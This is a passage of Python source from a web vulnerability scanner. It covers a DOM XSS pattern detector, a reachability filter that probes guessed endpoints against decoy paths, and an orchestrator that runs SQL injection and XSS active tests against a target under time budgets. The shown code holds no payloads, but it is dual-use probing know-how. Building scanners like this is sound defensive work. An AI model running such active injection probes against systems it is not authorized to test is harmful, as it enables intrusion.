                context_end = min(len(lines), line_num + 5)
                context = "\n".join(lines[context_start:context_end])

                source_nearby = False
                source_found = None
                for source_pattern in DOM_XSS_SOURCES:
                    if re.search(source_pattern, context, re.I):
                        source_nearby = True
                        source_found = source_pattern
                        break

                # Only report if source is nearby (likely taint flow)
                if source_nearby:
                    # Extract the vulnerable code snippet
                    snippet = line.strip()[:200]

                    findings.append({
                        "type": "DOM_XSS",
                        "sink_type": sink_name,
                        "severity": severity,
                        "file": source_url,
                        "line": line_num,
                        "snippet": snippet,
                        "source_nearby": source_nearby,
                        "source_pattern": source_found,
                        "confidence": 0.7 if source_nearby else 0.4,
                        "evidence": [
                            f"Sink: {sink_name} at line {line_num}",
                            f"Source: {source_found} found nearby",
                            f"Code: {snippet}",
                        ],
                        "description": f"Potential DOM XSS: {sink_name} sink with {source_found} source",
                    })

    return findings


def _split_active_family_budget(active_max_seconds: float, run_sqli: bool, run_xss: bool) -> tuple[float, float]:
    """Reserve active-test time for both SQLi and XSS when both families run."""
    active_max_seconds = max(0.0, float(active_max_seconds))
    if not (run_sqli and run_xss) or active_max_seconds <= 1.0:
        return active_max_seconds, 0.0

    xss_reserved_seconds = max(30.0, active_max_seconds * 0.30)
    xss_reserved_seconds = min(xss_reserved_seconds, active_max_seconds * 0.45)
    xss_reserved_seconds = min(xss_reserved_seconds, max(0.0, active_max_seconds - 1.0))
    sqli_max_seconds = max(1.0, active_max_seconds - xss_reserved_seconds)
    return sqli_max_seconds, xss_reserved_seconds


USE_DEFAULT_MAX_FINDINGS_PER_FAMILY: Any = object()


ACTIVE_FAMILY_DISPATCH_ORDER = ("sqli", "xss")


def _enabled_active_family_names(*, run_sqli: bool, run_xss: bool) -> tuple[str, ...]:
    enabled = {
        "sqli": bool(run_sqli),
        "xss": bool(run_xss),
    }
    return tuple(name for name in ACTIVE_FAMILY_DISPATCH_ORDER if enabled.get(name))


# Endpoint sources that were actually observed (crawl / spec / browser / HAR /
# manual). These are never reachability-dropped. Everything else is a
# synthesized/guessed path (blind wordlist + API-version permutations) which can
# explode into phantom 404s that drown the active budget and hang the scan, so
# those are probed first and dropped if they don't exist.
_ACTIVE_OBSERVED_SOURCES = frozenset({
    "har_discovery", "har", "har_network_capture", "browser", "browser_api",
    "browser_api_endpoints", "crawl", "url_crawl", "openapi", "swagger",
    "graphql", "manual", "manual_endpoints", "form", "hash_route",
    "resource_id_propagation", "js_bundle_analysis", "katana",
})


def _is_synthetic_active_source(endpoint: dict[str, Any]) -> bool:
    return str(endpoint.get("source") or "").strip().lower() not in _ACTIVE_OBSERVED_SOURCES


def _response_matches_not_found(
    status: int | None,
    body_len: int,
    decoy_status: int | None,
    decoy_len: int,
) -> bool:
    """Pure: does this look like a not-found page (a phantom we should not fuzz)?

    Clear 404/410 always counts. Otherwise it counts only when the response
    matches a *sibling* decoy (a random path under the SAME parent): same status
    and near-identical body length means the parent serves every child the same
    way, i.e. the route does not exist. Only ever applied to synthetic-source
    endpoints, so matching 401/403/5xx to a decoy is safe (a real observed route
    is never gated). ``status is None`` (transient error) is kept.
    """
    if status is None:
        return False
    if status in (404, 410):
        return True
    if (
        decoy_status is not None
        and status == decoy_status
        and decoy_len >= 0
        and abs(body_len - decoy_len) <= max(48, int(decoy_len * 0.07))
    ):
        return True
    return False


async def _filter_reachable_active_endpoints(
    base_url: str,
    endpoints: list[dict],
    auth_session: Any | None = None,
    *,
    max_probe: int = 1500,
    max_parents: int = 250,
    concurrency: int = 24,
    timeout: float = 4.0,
) -> list[dict]:
    """Drop *synthesized* endpoints that don't exist so the active budget reaches
    real routes instead of hanging on guessed permutations (e.g. the blind
    ``/api/v{n}/oauth2/authorize`` / ``/rest/v{n}/auth/register`` explosion).

    Uses a *per-parent sibling decoy*: for each candidate path, a random leaf under
    the same parent is probed; if the candidate responds the same as that decoy
    (same status + near-identical body length), the parent serves all children
    identically, so the route doesn't exist. This catches ``/rest`` and ``/api``
    404/SPA signatures a single root decoy would miss. Observed endpoints are never
    probed or dropped. Best-effort: on any error, returns ``endpoints`` unchanged.
    """
    synthetic = [e for e in endpoints if isinstance(e, dict) and _is_synthetic_active_source(e)]
    if len(synthetic) < 5:
        return endpoints
    try:
        import aiohttp
    except Exception:
        return endpoints

    headers, cookies = {}, {}
    try:
        if auth_session and getattr(auth_session, "config", None):
            headers = dict(getattr(auth_session.config, "headers", {}) or {})
            cookies = dict(getattr(auth_session.config, "cookies", {}) or {})
    except Exception:
        headers, cookies = {}, {}

    def _abs(raw: Any) -> str:
        u = str(raw or "")
        return u if u.startswith("http") else urllib.parse.urljoin(base_url, u if u.startswith("/") else "/" + u)

    def _parent(path: str) -> str:
        segs = [s for s in path.split("/") if s]
        return "/" + "/".join(segs[:-1]) if segs else "/"

    cand_paths: list[str] = []
    seen: set[str] = set()
    for ep in synthetic:
        path = urllib.parse.urlparse(_abs(ep.get("url") or ep.get("path"))).path or "/"
        if path not in seen:
            seen.add(path)
            cand_paths.append(path)
    cand_paths = cand_paths[:max_probe]

    parents: list[str] = []
    pseen: set[str] = set()
    for path in cand_paths:
        par = _parent(path)
        if par not in pseen:
            pseen.add(par)
            parents.append(par)
    parents = parents[:max_parents]
    _DECOY_LEAF = "shakerscan-not-real-zzqx7"

    sem = asyncio.Semaphore(concurrency)

    async def _probe(session, full_url):
        async with sem:
            try:
                async with session.get(
                    full_url, timeout=aiohttp.ClientTimeout(total=timeout),
                    allow_redirects=True, ssl=False,
                ) as resp:
                    return resp.status, len(await resp.text())
            except Exception:
                return None, -1

    try:
        async with aiohttp.ClientSession(headers=headers, cookies=cookies) as session:
            decoy_targets = [(par, _abs(par.rstrip("/") + "/" + _DECOY_LEAF)) for par in parents]
            decoy_results = await asyncio.gather(*[_probe(session, u) for (_par, u) in decoy_targets])
            decoy_by_parent = {par: res for (par, _u), res in zip(decoy_targets, decoy_results)}
            # ALWAYS probe each candidate, then compare it to its parent's sibling
            # decoy. A parent's random sibling returning 404 does NOT imply the
            # parent is empty — a real route (/rest/products/search) can coexist
            # with /rest/products/<random> -> 404. Inferring "parent 404 => all
            # children gone" without probing would drop real routes and make a
            # vulnerable app look clean, so no such fast-path is used.
            to_probe = cand_paths[:max_probe]
            cand_results = await asyncio.gather(*[_probe(session, _abs(p)) for p in to_probe])
    except Exception:
        return endpoints

    unreachable: set[str] = set()
    for path, (status, blen) in zip(to_probe, cand_results):
        d_status, d_len = decoy_by_parent.get(_parent(path), (None, -1))
        if _response_matches_not_found(status, blen, d_status, d_len):
            unreachable.add(path)
    if not unreachable:
        return endpoints

    kept, dropped = [], 0
    for ep in endpoints:
        if isinstance(ep, dict) and _is_synthetic_active_source(ep):
            path = urllib.parse.urlparse(_abs(ep.get("url") or ep.get("path"))).path or "/"
            if path in unreachable:
                dropped += 1
                continue
        kept.append(ep)
    if not kept:
        return endpoints  # guard against a misfiring decoy
    print(
        f"[active] Reachability gate: dropped {dropped} phantom synthetic endpoint(s) "
        f"({len(unreachable)} unreachable / {len(cand_paths)} probed across {len(parents)} parents); "
        f"{len(kept)} remain",
        file=sys.stderr,
    )
    return kept


async def run_smart_active_tests(
    url: str,
    endpoints: list[dict],
    tech_stack: list[str] | None = None,
    dbms: str | None = None,
    signals: dict | None = None,
    auth_session: Any | None = None,
    run_xss: bool = True,
    run_sqli: bool = True,
    thorough_params: bool = False,
    active_max_seconds: int | float | None = None,
    active_max_endpoints: int | None = None,
    active_params_per_endpoint: int | None = None,
    max_findings_per_family: int | None | Any = USE_DEFAULT_MAX_FINDINGS_PER_FAMILY,
) -> dict:
    """
    Run all smart active tests (SQLi + XSS).

    Args:
        url: Base URL
        endpoints: List of endpoints with params
        tech_stack: Detected technologies
        dbms: Pre-detected DBMS
        signals: Vulnerability signals from nuclei to guide testing
        auth_session: AuthSession for authenticated requests (optional)
        run_xss: Whether to run XSS checks
        run_sqli: Whether to run SQLi checks
        thorough_params: If True, test 100 endpoints x 10 params instead of 50x5 (default)

    Returns:
        Combined results from all tests
    """
    tech_stack = tech_stack or []
    signals = signals or {}
    requested_active_max_seconds = active_max_seconds

    # Thorough mode uses expanded limits
    if thorough_params:
        sqli_max_endpoints = 100
        sqli_max_params = 10
        xss_max_endpoints = 100
        xss_max_params = 10
        default_active_max_seconds = 1200.0
        default_max_findings_per_family = None
    else:
        sqli_max_endpoints = 35
        sqli_max_params = 5
        xss_max_endpoints = 35
        xss_max_params = 5
        default_active_max_seconds = 600.0
        default_max_findings_per_family = 8

    if active_max_endpoints is not None:
        sqli_max_endpoints = max(1, int(active_max_endpoints))
        xss_max_endpoints = max(1, int(active_max_endpoints))
    if active_params_per_endpoint is not None:
        sqli_max_params = max(1, int(active_params_per_endpoint))
        xss_max_params = max(1, int(active_params_per_endpoint))
    if requested_active_max_seconds is None:
        active_max_seconds = default_active_max_seconds
    else:
        active_max_seconds = float(requested_active_max_seconds)
    if max_findings_per_family is USE_DEFAULT_MAX_FINDINGS_PER_FAMILY:
        max_findings_per_family = default_max_findings_per_family
    elif max_findings_per_family is not None:
        max_findings_per_family = max(0, int(max_findings_per_family))

    if thorough_params:
        print(
            (
                "[active] Thorough parameter mode enabled; effective budget "
                f"SQLi {sqli_max_endpoints} endpoints x {sqli_max_params} params, "
                f"XSS {xss_max_endpoints} endpoints x {xss_max_params} params"
            ),
            file=sys.stderr,
        )

    print(f"[active] Running smart active tests on {len(endpoints)} endpoints", file=sys.stderr)
    _emit_scan_progress("active", 91, f"starting smart active tests on {len(endpoints)} endpoints")
    if signals:
        active_signals = [k for k, v in signals.items() if v]
        if active_signals:
            print(f"[active] Signal hints from nuclei: {', '.join(active_signals)}", file=sys.stderr)

    # Count POST endpoints
    post_endpoints = [e for e in endpoints if e.get("method", "GET").upper() in ("POST", "PUT", "PATCH") and e.get("body_params")]
    if post_endpoints:
        print(f"[active] Found {len(post_endpoints)} POST endpoints with body params to test", file=sys.stderr)

    # Prioritize endpoints based on signals
    prioritized_endpoints = endpoints
    if signals.get("sql_errors") or signals.get("auth_issues"):
        # SQL signals detected - prioritize endpoints with auth-related params
        sql_priority_params = ["id", "user", "uid", "account", "login", "query", "search", "filter"]
        prioritized_endpoints = sorted(
            endpoints,
            key=lambda e: sum(
                1
                for p in (
                    _coerce_param_names(e.get("params"))
                    + _coerce_param_names(e.get("query_params"))
                    + _coerce_param_names(e.get("body_params"))
                )
                if any(sp in p.lower() for sp in sql_priority_params)
            ),
            reverse=True
        )

    # Drop synthesized phantom endpoints (404/soft-404) BEFORE fuzzing so the
    # active budget reaches real routes instead of hanging on guessed permutations
    # (e.g. blind /api/v{n}/oauth2/authorize). Observed routes are never dropped.
    try:
        prioritized_endpoints = await _filter_reachable_active_endpoints(
            url, prioritized_endpoints, auth_session,
        )
    except Exception as _reach_err:
        print(f"[active] reachability gate skipped: {_reach_err}", file=sys.stderr)

    # Run SQLi and XSS tests with signal awareness. Smart scans should remain
    # adaptive, but they still need an overall active probing budget so one
    # slow target or broad OpenAPI schema cannot dominate the full scan.
    active_started = time.monotonic()

    def _remaining_active_seconds() -> float:
        return max(0.0, active_max_seconds - (time.monotonic() - active_started))

    sqli_active_max_seconds, xss_reserved_seconds = _split_active_family_budget(
        active_max_seconds,
        run_sqli,
        run_xss,
    )
    if run_sqli and run_xss:
        print(
            (
                "[active] Split active budget: "
                f"SQLi <= {sqli_active_max_seconds:.0f}s, "
                f"XSS reserve >= {xss_reserved_seconds:.0f}s"
            ),
            file=sys.stderr,
        )

    sqli_results = {
        "findings": [],
        "dbms_detected": dbms,
        "vulnerabilities_found": 0,
        "get_endpoints_tested": 0,
        "post_endpoints_tested": 0,
        "endpoints_tested": 0,
        "skipped": True,
        "reason": "sql_tests_disabled",
    }
    xss_results = {
        "findings": [],
        "reflections_found": 0,
        "vulnerabilities_found": 0,
        "endpoints_tested": 0,
        "skipped": True,
        "reason": "xss_tests_disabled",
    }

    for family_name in _enabled_active_family_names(run_sqli=run_sqli, run_xss=run_xss):
        if family_name == "sqli":
            _emit_scan_progress("active_sqli", 91, "starting SQLi probes")
            sqli_remaining = min(_remaining_active_seconds(), sqli_active_max_seconds)
            sqli_results = await smart_sqli_test(
                url, prioritized_endpoints, dbms, auth_session,
                max_endpoints=sqli_max_endpoints,
                max_params_per_endpoint=sqli_max_params,
                max_seconds=sqli_remaining,
                max_findings=max_findings_per_family,
            )
            continue

        if family_name == "xss":
            remaining = _remaining_active_seconds()
            if remaining <= 1.0:
                print("[active] Skipping XSS probes: active probing time budget exhausted by SQLi", file=sys.stderr)
                _emit_scan_progress("active_xss", 92, "skipping XSS probes; active time budget exhausted")
                xss_results = {
                    "findings": [],
                    "reflections_found": 0,
                    "vulnerabilities_found": 0,
                    "endpoints_tested": 0,
                    "skipped": True,
                    "reason": "active_time_budget_exhausted",
                    "budget_exhausted": True,
                    "budget_exhausted_reason": "time_budget",
                }
            else:
                _emit_scan_progress("active_xss", 92, "starting XSS probes")
                xss_results = await smart_xss_test(
                    url, endpoints, auth_session=auth_session,
                    max_endpoints=xss_max_endpoints,
                    max_params_per_endpoint=xss_max_params,
                    max_seconds=remaining,
                    max_findings=max_findings_per_family,
                )

    # Hash-route DOM XSS is part of XSS coverage. Keep it in default smart
    # scans, but honor focused SQLi-only scans.
    if run_xss:
        _emit_scan_progress("active_dom_xss", 93, "starting DOM XSS probes")
        hash_route_results = await hash_route_dom_xss_test(
            endpoints,
            max_endpoints=xss_max_endpoints,
            max_params_per_endpoint=xss_max_params
        )
    else:
        hash_route_results = {
            "findings": [],
            "endpoints_tested": 0,
            "params_tested": 0,
            "vulnerabilities_found": 0,
            "skipped": True,
            "reason": "xss_tests_disabled",
        }

    # Combine findings
    sqli_findings = sqli_results.get("findings", [])
    xss_findings = xss_results.get("findings", [])
    hash_route_findings = hash_route_results.get("findings", [])
    all_findings = sqli_findings + xss_findings + hash_route_findings
    endpoint_attempts = _merge_endpoint_attempt_telemetry(
        sqli_results.get("endpoint_attempts"),
        xss_results.get("endpoint_attempts"),
        hash_route_results.get("endpoint_attempts"),
    )
    active_elapsed_seconds = time.monotonic() - active_started
    active_remaining_seconds = _remaining_active_seconds()
    _emit_scan_progress("active", 94, "smart active tests complete")

    return {
        "findings": all_findings,
        "sqli": {
            "findings": sqli_findings,
            "dbms_detected": sqli_results.get("dbms_detected"),
            "vulnerabilities_found": sqli_results.get("vulnerabilities_found", 0),
            "get_endpoints_tested": sqli_results.get("get_endpoints_tested", 0),
            "post_endpoints_tested": sqli_results.get("post_endpoints_tested", 0),
            "endpoints_tested": sqli_results.get("endpoints_tested", 0),
            "params_tested": sqli_results.get("params_tested", 0),
            "budget_exhausted": sqli_results.get("budget_exhausted", False),
            "budget_exhausted_reason": sqli_results.get("budget_exhausted_reason"),
            "endpoint_attempts": sqli_results.get("endpoint_attempts", []),
        },
        "xss": {
            "findings": xss_findings + hash_route_findings,  # Include hash route DOM XSS in XSS results
            "reflections_found": xss_results.get("reflections_found", 0),
            "vulnerabilities_found": xss_results.get("vulnerabilities_found", 0) + hash_route_results.get("vulnerabilities_found", 0),
            "endpoints_tested": xss_results.get("endpoints_tested", 0) + hash_route_results.get("endpoints_tested", 0),
            "params_tested": xss_results.get("params_tested", 0) + hash_route_results.get("params_tested", 0),
            "get_endpoints_tested": xss_results.get("get_endpoints_tested", 0) + hash_route_results.get("endpoints_tested", 0),
            "post_endpoints_tested": xss_results.get("post_endpoints_tested", 0),
            "budget_exhausted": xss_results.get("budget_exhausted", False),
            "budget_exhausted_reason": xss_results.get("budget_exhausted_reason"),
            "endpoint_attempts": (xss_results.get("endpoint_attempts", []) or []) + (hash_route_results.get("endpoint_attempts", []) or []),
        },
        "hash_route_dom_xss": hash_route_results,  # Separate tracking for hash route DOM XSS
        "endpoint_attempts": endpoint_attempts,
        "dbms_detected": sqli_results.get("dbms_detected"),
        "budget": {
            "active_max_seconds": active_max_seconds,
            "active_sqli_max_seconds": sqli_active_max_seconds,
            "active_xss_reserved_seconds": xss_reserved_seconds,
            "active_elapsed_seconds": active_elapsed_seconds,
            "active_remaining_seconds": active_remaining_seconds,
            "active_max_endpoints": max(sqli_max_endpoints, xss_max_endpoints),
            "active_params_per_endpoint": max(sqli_max_params, xss_max_params),
            "max_findings_per_family": max_findings_per_family,
        },
        "total_endpoints_tested": sqli_results.get("endpoints_tested", 0) + xss_results.get("endpoints_tested", 0) + hash_route_results.get("endpoints_tested", 0),
        "total_params_tested": sqli_results.get("params_tested", 0) + xss_results.get("params_tested", 0) + hash_route_results.get("params_tested", 0),
    }
